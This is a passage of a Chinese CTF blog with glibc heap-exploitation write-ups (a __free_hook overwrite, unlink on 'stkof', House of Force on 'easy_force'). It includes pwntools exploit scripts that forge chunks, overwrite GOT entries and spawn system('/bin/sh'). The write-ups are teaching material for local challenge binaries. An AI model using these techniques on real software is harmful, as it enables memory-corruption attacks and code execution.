-<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">11</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x20</span>) // __free_hook</span><br><span class="line">edit(<span class="number">12</span>,p64(system))</span><br><span class="line">dele(<span class="number">10</span>) //触发system(/<span class="built_in">bin</span>/sh)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<p>这样就打通了。</p>
-<h4 id="🐖：-2"><a href="#🐖：-2" class="headerlink" title="🐖："></a>🐖：</h4><p>在调试的时候发现重新申请chunk的时候会优先用unsortedbin部分的chunk</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">9</span>,<span class="number">0x20</span>)    ///<span class="number">1</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x20</span>)   ///<span class="number">2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x20</span>)   ///<span class="number">3</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x20</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>初始状态：</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203222607081.png" alt="image-20251203222607081"></p>
-<h5 id="1"><a href="#1" class="headerlink" title="1:"></a>1:</h5><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203222709430.png" alt="image-20251203222709430"></p>
-<h5 id="2"><a href="#2" class="headerlink" title="2:"></a>2:</h5><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203222723903.png" alt="image-20251203222723903"></p>
-<p>可以看到<code>glibc</code>优先分配的是<code>unsortedbin</code>中的chunk</p>
-<h5 id="3"><a href="#3" class="headerlink" title="3:"></a>3:</h5><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203222735752.png" alt="image-20251203222735752"></p>
-<p><code>unsortedbin</code>分配完后 会从top chunk中分割。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://rjcnb666.github.io/2025/12/01/unlink/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/tou.jpg">
-      <meta itemprop="name" content="JC">
-      <meta itemprop="description" content="ʕ´•ᴥ• ʔ">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="mvegetable'blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/12/01/unlink/" class="post-title-link" itemprop="url">unlink</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-12-01 22:39:44" itemprop="dateCreated datePublished" datetime="2025-12-01T22:39:44+08:00">2025-12-01</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-12-05 01:17:02" itemprop="dateModified" datetime="2025-12-05T01:17:02+08:00">2025-12-05</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>3.4k</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>在执行_int_free()函数的时候会执行unlink:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD)</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> _int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line"><span class="built_in">free</span>()&#123;</span><br><span class="line">	_int_free()&#123;</span><br><span class="line">		unlink();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>chunk1 free进入unsortedbin 的时候，如果相邻地址的chunk的chunk2处于空闲状态：</p>
-<p><strong>unlink会将chunk1和chunk2进行合并操作，而chunk2的fd和bk位置对应的地址就会进行unlink也就是断链操作。</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">         <span class="type">long</span> *hollk1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">         <span class="type">long</span> *first_chunk = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">         <span class="type">long</span> *hollk3 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">         <span class="type">long</span> *second_chunk = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">         <span class="type">long</span> *hollk5 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">         <span class="type">long</span> *third_chunk = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">         <span class="type">long</span> *hollk7 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">         </span><br><span class="line">         <span class="built_in">free</span>(first_chunk);</span><br><span class="line">         <span class="built_in">free</span>(second_chunk);</span><br><span class="line">         <span class="built_in">free</span>(third_chunk);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-
-<p>全部free完成后的情况：</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201212019654.png" alt="image-20251201212019654"></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201212106544.png" alt="image-20251201212106544"></p>
-<p>注：0x440是<code>chunk2</code>    0x669是<code>chunk1</code>    0x9a2是<code>chunk3</code> 0x4d0是<code>chunk4</code></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201230538872.png" alt="image-20251201230538872"></p>
-<p>这里在进行free（Chunk4）的时候 由于chunk2与chunk4相邻就会合并chunk2 而chunk1和chunk3的bk 和 fd就会进行Unlink:</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201225847125.png" alt="image-20251201225847125"></p>
-<p>但是还需要绕过一下三个<strong>检测</strong>：</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201225936936.png" alt="image-20251201225936936"></p>
-<ol>
-<li><p><strong>检查1</strong>：检查与被释放chunk相邻高地址的chunk的prevsize的值是否等于被释放chunk的size大小</p>
-<p>可以看左图绿色框中的内容，上面绿色框中的内容是second_chunk的size大小，下面绿色框中的内容是hollk5的prev_size，这两个绿色框中的数值是需要相等的（忽略P标志位）</p>
-</li>
-<li><p><strong>检查2</strong>：检查与被释放chunk相邻高地址的chunk的size的P标志位是否为0</p>
-<p>可以看左图蓝色框中的内容，这里是hollk5的size，hollk5的size的P标志位为0，代表着它前一个chunk(second_chunk)为空闲状态</p>
-</li>
-<li><p><strong>检查3</strong>：检查前后被释放chunk的fd和bk</p>
-<p>可以看左图红色框中的内容，这里是second_chunk的fd和bk。首先看fd，它指向的位置就是前一个被释放的块first_chunk，这里需要检查的是first_chunk的bk是否指向second_chunk的地址。再看second_chunk的bk，它指向的是后一个被释放的块third_chunk，这里需要检查的是third_chunk的fd是否指向second_chunk的地址。</p>
-</li>
-</ol>
-<h2 id="stkof"><a href="#stkof" class="headerlink" title="stkof"></a>stkof</h2><h3 id="creat"><a href="#creat" class="headerlink" title="creat:"></a>creat:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201214023872.png" alt="image-20251201214023872"></p>
-<h3 id="delete"><a href="#delete" class="headerlink" title="delete:"></a>delete:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201214134444.png" alt="image-20251201214134444"></p>
-<h3 id="edit"><a href="#edit" class="headerlink" title="edit:"></a>edit:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201214139392.png" alt="image-20251201214139392"></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201214644090.png" alt="image-20251201214644090"></p>
-<p>创立的chunk 只需要管后两个堆块</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201214657971.png" alt="image-20251201214657971"></p>
-<p>存储heap的数组n</p>
-<p>下面讲解一下unlink的部分：</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">alloc(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">pay = p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) </span><br><span class="line">pay +=p64(<span class="number">0x602138</span>) + p64(<span class="number">0x602140</span>)</span><br><span class="line">pay +=p64(<span class="number">0x20</span>)</span><br><span class="line">pay = pay.ljust(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">pay += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
-
-<p>unlink的目的是控制数组n 实现任意地址写：</p>
-<p>利用edit伪造了一个已经free掉进入unsortedbin中的chunk 然后free(chunk3)的时候触发unlink 实现了修改chunk3 fd的目的。</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201230227275.png" alt="image-20251201230227275"></p>
-<p>fake chunk:</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201215704590.png" alt="image-20251201215704590"></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201230159757.png" alt="image-20251201230159757"></p>
-<p>可以看到绕过了上述的检测。</p>
-<p>这里看一下伪造的fd 和 bk 也就是chunk3和chunk2：</p>
-<p>这两个伪造的堆块位于数组n</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201215923846.png" alt="image-20251201215923846"></p>
-<p>38的bk和40的fd都指向我们伪造的fake chunk </p>
-<p>然后free chunk3（与fake chunk地址相邻）后：</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201230126886.png" alt="image-20251201230126886"></p>
-<p>① fake_chunk被摘除之后首先执行的就是first_bk &#x3D; third_addr，也就是说first_chunk的bk由原来指向fake_chunk地址更改成指向third_chunk地址：</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201230014783.png" alt="image-20251201230014783"></p>
-<p>② 接下来执行<code>third_fd = first_addr</code>，即third_chunk的fd由由原来指向fake_chunk地址更改成first_chunk地址：</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201230046906.png" alt="image-20251201230046906"></p>
-<p>这里需要注意的是<code>third_chunk的fd</code>与<code>first_chunk的bk</code>更改的其实是一个位置，但是由于third_fd &#x3D; first_addr<code>后执行</code>，所以此处内容会从0x602140被覆盖成0x602138。</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201220335322.png" alt="image-20251201220335322"></p>
-<p>总结一下：最终利用的是修改third chunk(fake chunk)的fd指向数组n。</p>
-<p>后续通过数组n实现任意地址写：</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pay2 = p64(<span class="number">0</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]) </span><br><span class="line">gdb.attach(p)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(pay2),pay2)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201220933985.png" alt="image-20251201220933985"></p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(hollkelf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload) //把free覆盖成puts函数</span><br><span class="line">puts_addr = hollk.recvuntil(<span class="string">&#x27;\nOK\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line">log.success(<span class="string">&#x27;puts addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p>触发system(binsh)</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = p64(system_addr)</span><br><span class="line">edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload) //把auti覆盖成system</span><br><span class="line">p.send(p64(binsh_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://rjcnb666.github.io/2025/11/28/House%20of%20force/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/tou.jpg">
-      <meta itemprop="name" content="JC">
-      <meta itemprop="description" content="ʕ´•ᴥ• ʔ">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="mvegetable'blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/11/28/House%20of%20force/" class="post-title-link" itemprop="url">House of force</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-11-28 22:39:44" itemprop="dateCreated datePublished" datetime="2025-11-28T22:39:44+08:00">2025-11-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-12-05 01:16:55" itemprop="dateModified" datetime="2025-12-05T01:16:55+08:00">2025-12-05</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>4.6k</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="House-of-force"><a href="#House-of-force" class="headerlink" title="House of force"></a>House of force</h1><h2 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h2><ol>
-<li>能够以溢出等方式控制到 top chunk 的 size 域</li>
-<li>能够自由地控制堆分配尺寸的大小</li>
-</ol>
-<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p><strong>利用malloc函数对top chunk的利用，使得堆块指向我们期望的地址，再次申请堆块就可以实现任意地址写。</strong></p>
-<h2 id="源码"><a href="#源码" class="headerlink" title="源码:"></a>源码:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取当前的top chunk，并计算其对应的大小</span></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = chunksize(victim);</span><br><span class="line"><span class="comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) </span><br><span class="line"><span class="comment">//nb是用户申请的堆块的大小加上头堆块 </span></span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    <span class="comment">// 新的top chunk的大小</span></span><br><span class="line">    remainder = chunk_at_offset(victim, nb)；</span><br><span class="line">    <span class="comment">//等价于remainder = (mchunkptr)((char*)victim + nb); 获取新的top chunk的地址</span></span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    <span class="comment">//更新top chunk地址</span></span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h2><p>只要满足把top chunk的size改成一个很大的值，就可以通过这个检测。</p>
-<p>一般把top chunk size的值改为-1 size是unsigned int类型就会变成0xffffffffffffffff  从而绕过检测。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> *ptr,*ptr2;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="type">long</span> *)(((<span class="type">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr=<span class="number">-1</span>;        <span class="comment">// &lt;=== 这里把top chunk的size域改为0xffffffffffffffff</span></span><br><span class="line">    <span class="built_in">malloc</span>(offset);  <span class="comment">// &lt;=== 减小top chunk指针</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);   <span class="comment">// &lt;=== 分配块实现任意地址写</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里的offset就是想控制top chunk移动后的位置。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">offset = target - <span class="number">0x10</span> <span class="comment">//nb</span></span><br><span class="line">       -=top </span><br><span class="line">    </span><br><span class="line"><span class="built_in">malloc</span>(offset) <span class="comment">// 此时new top chunk的头地址就会位于 target-0x10的位置</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>) <span class="comment">//实现任意地址写    </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>这里<code>offset</code>也可以是负数 （控制<code>topchunk</code>向低地址偏移）</p>
-<ul>
-<li><p>由于我们的<code>top chunk size</code>是-1 所以可以绕过检测。</p>
-</li>
-<li><p><code>new top chunk</code>的size我们不需要关系 重要的是<code>new top chunk</code>的地址 ,也就是：</p>
-<p><code>remainder = chunk_at_offset(victim, nb):</code></p>
-<p>这里我们的nb是一个负数  虽然转化成unsigned int类型会变成一个很大的正数 但是计算的时候会经过处理变成正常的加减法 就把他当成正常负数看就好。</p>
-</li>
-</ul>
-<h2 id="例题：2023-羊城杯决赛easy-force"><a href="#例题：2023-羊城杯决赛easy-force" class="headerlink" title="例题：2023 羊城杯决赛easy_force"></a>例题：2023 羊城杯决赛easy_force</h2><h3 id="main："><a href="#main：" class="headerlink" title="main："></a><strong>main：</strong></h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127122736424.png" alt="image-20251127122736424"></p>
-<h3 id="add"><a href="#add" class="headerlink" title="add:"></a><strong>add:</strong></h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127122801609.png" alt="image-20251127122801609"></p>
-<h3 id="保护："><a href="#保护：" class="headerlink" title="保护："></a><strong>保护：</strong></h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127123220721.png" alt="image-20251127123220721"></p>
-<p>这里只给了4次add函数的机会 ， 其他的函数都无用。</p>
-<h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a><strong>思路：</strong></h3><p>通过house of force 把 malloc_hook 改成 system(\bin\sh)。</p>
-<h3 id="解题："><a href="#解题：" class="headerlink" title="解题："></a><strong>解题：</strong></h3><h4 id="首先通过mmap泄露libc基地址："><a href="#首先通过mmap泄露libc基地址：" class="headerlink" title="首先通过mmap泄露libc基地址："></a>首先通过<code>mmap</code>泄露<code>libc</code>基地址：</h4><p>在处理大 chunk 时的行为：<br>glibc 的 <code>malloc</code> 对于大于<code> mmap_threshold</code> 的申请，不使用 heap，而是直接调用 mmap() 向内核申请一块内存。<br>默认情况下，这个阈值在 128 KB 左右（也可能是更大）<br>(比如：<code>malloc(0x20000)</code> ➜ 会使用 <code>mmap</code>)</p>
-<p><code>mmap </code>分配的大 <code>chunk</code> 地址规律：</p>
-<p>使用<code>mmap()</code>分配的内存块，一般在 libc 映射地址之下；<br>在默认的内存布局中，<code>mmap()</code> 返回的地址和 libc.so 的加载基址存在一个固定偏移；</p>
-<p>申请一个超大 chunk（触发 <code>mmap</code>）<br>打印这个 chunk 的地址<br>减去偏移,得到 libc base</p>
-<p>这个偏移值是固定的（取决于特定 libc 版本的布局），你只要知道 libc 版本，就可以知道偏移量。</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">3</span>, <span class="number">0x888888</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line"><span class="comment">#add(1, 0x888888, &#x27;aaa&#x27;)</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">libc.address= <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)+<span class="number">0x888ff0</span></span><br><span class="line">log.success(<span class="string">&quot;libc.address :&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/ye2.png" alt="Image #1"></p>
